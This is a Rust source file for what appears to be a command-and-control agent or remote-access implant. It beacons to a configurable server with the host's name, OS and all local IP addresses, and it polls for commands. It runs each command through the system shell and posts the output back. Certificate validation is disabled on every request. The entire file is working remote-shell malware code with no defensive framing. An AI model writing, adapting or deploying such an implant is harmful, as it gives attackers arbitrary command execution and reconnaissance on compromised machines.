use std::io;
use std::process::Command;
use std::path::Path;
use serde_json::json;
use hostname;
use os_info;
use std::env;
use get_if_addrs::get_if_addrs;
use tokio::time::timeout;
use std::time::{Duration}; // commented out SystemTime, UNIX_EPOCH
use reqwest::StatusCode;

#[cfg(windows)]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new("cmd");
    cmd.arg("/C").arg(command);
    cmd.args(args);
    cmd
}

#[cfg(not(windows))]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new(command);
    cmd.args(args);
    cmd
}

fn get_all_local_ips() -> Vec<String> {
    let mut ips = Vec::new();
    if let Ok(ifaces) = get_if_addrs() {
        for iface in ifaces {
            match iface.addr {
                get_if_addrs::IfAddr::V4(v4) => {
                    if !v4.ip.is_loopback() {
                        ips.push(v4.ip.to_string());
                    }
                }
                get_if_addrs::IfAddr::V6(v6) => {
                    if !v6.ip.is_loopback() {
                        ips.push(v6.ip.to_string());
                    }
                }
            }
        }
    }
    ips
}

async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
    if cmd_parts.is_empty() {
        return Ok(String::new());
    }

    // Handle cd command specially
    if cmd_parts[0] == "cd" {
        if let Some(dir) = cmd_parts.get(1) {
            let path = Path::new(dir);
            if path.exists() {
                env::set_current_dir(path)?;
                return Ok(format!("Changed directory to {}", env::current_dir()?.display()));
            } else {
                return Err(io::Error::new(io::ErrorKind::NotFound, "Directory not found"));
            }
        }
        return Ok(format!("Current directory: {}", env::current_dir()?.display()));
    }

    // Handle other commands with timeout
    let result = timeout(Duration::from_secs(30), async {
        let output = if cfg!(windows) {
            let full_command = cmd_parts.join(" ");
            create_command(&full_command, &[]).output()?
        } else {
            create_command(cmd_parts[0], &cmd_parts[1..]).output()?
        };

        Ok::<_, io::Error>(format!("{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)))
    }).await;

    match result {
        Ok(Ok(output)) => Ok(output),
        Ok(Err(e)) => Err(e),
        Err(_) => Err(io::Error::new(io::ErrorKind::TimedOut, "Command timed out after 30 seconds"))
    }
}

async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
    let url = format!("{}/api/agent/{}/heartbeat", server_addr, agent_id);
    println!("[DEBUG] Sending heartbeat to {} for agent {}", url, agent_id);
    
    let os = os_info::get();
    let hostname = hostname::get()?
        .to_string_lossy()
        .to_string();
    let ip_list = get_all_local_ips();
    let ip = if ip_list.is_empty() { "Unknown".into() } else { ip_list.join(",") };

    let data = json!({
        "id": agent_id,
        "os": os.os_type().to_string(),
        "hostname": hostname,
        "ip": ip,
        "ip_list": ip_list,
        "commands": Vec::<String>::new()
    });

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

    let response = client.post(&url)
        .json(&data)
        .send()
        .await
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

    if !response.status().is_success() {
        return Err(io::Error::new(io::ErrorKind::Other, 
            format!("Heartbeat failed with status: {}", response.status())));
    }

    println!("[DEBUG] Heartbeat response: {}", response.status());
    Ok(())
}

async fn get_command(server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
    let url = format!("{}/api/agent/{}/command", server_addr, agent_id);
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

    let response = client.get(&url)
        .send()
        .await
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

    if response.status() == StatusCode::NO_CONTENT {
        return Ok(None);
    }

    if !response.status().is_success() {
        return Err(io::Error::new(io::ErrorKind::Other, 
            format!("Command fetch failed with status: {}", response.status())));
    }

    #[derive(serde::Deserialize)]
    struct CommandResponse {
        command: String,
    }

    let cmd_resp = response.json::<CommandResponse>()
        .await
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
    
    Ok(Some(cmd_resp.command))
}

async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output: &str) -> io::Result<()> {
    let url = format!("{}/api/agent/{}/result", server_addr, agent_id);
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
    
    // REMOVE timestamp from the data sent to the server
    let data = json!({
        "command": command,
        "output": output
    });

    let response = client.post(&url)
        .json(&data)
        .send()
        .await
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

    if !response.status().is_success() {
        return Err(io::Error::new(io::ErrorKind::Other, 
            format!("Result submission failed with status: {}", response.status())));
    }

    Ok(())
}

pub async fn run_shell(server_addr: &str, agent_id: &str) -> io::Result<()> {
    println!("[DEBUG] Starting shell with agent ID: {}", agent_id);
    send_heartbeat(server_addr, agent_id).await?;
    
    loop {
        println!("[DEBUG] Polling for commands...");
        match get_command(server_addr, agent_id).await? {
            Some(command) => {
                println!("[DEBUG] Received command: {}", command);
                
                let cmd_parts: Vec<&str> = command.split_whitespace().collect();
                
                match execute_command(&cmd_parts).await {
                    Ok(output) => {
                        if let Err(e) = submit_result(server_addr, agent_id, &command, &output).await {
                            println!("[ERROR] Failed to submit result: {}", e);
                        } else {
                            println!("[DEBUG] Result submitted successfully");
                        }
                    }
                    Err(e) => {
                        let error_msg = format!("Command failed: {}", e);
                        if let Err(e) = submit_result(server_addr, agent_id, &command, &error_msg).await {
                            println!("[ERROR] Failed to submit error result: {}", e);
                        }
                        println!("[ERROR] Shell error: {}. Retrying...", e);
                    }
                }
            }
            None => {
                tokio::time::sleep(Duration::from_secs(2)).await;
            }
        }
    }
}
